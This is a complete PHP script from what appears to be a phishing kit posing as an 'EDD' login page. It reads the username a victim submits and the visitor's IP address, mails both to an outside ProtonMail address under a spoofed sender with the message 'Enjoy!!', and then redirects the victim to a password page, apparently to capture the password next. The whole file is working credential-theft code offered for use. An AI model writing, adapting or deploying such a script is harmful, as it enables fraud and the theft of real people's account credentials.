<?php

$subject = " EDD LOGIN  ";



$ip = $_SERVER['REMOTE_ADDR'];

$email = $_POST['username']."\n";
$message = "Username: ".$_POST["username"]."\n";
$message .=  "I.p: " .$ip."\n" ."\n" ;
$message .=  "Enjoy!!" ."\n";
$headers = 'From: Logins@waya.com' . "\r\n" . 'Reply-To: Logins@waya.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();





mail ("dswaglogs@protonmail.com",$subject,$message, $headers);



header("location: signinpassword.html"); 



?>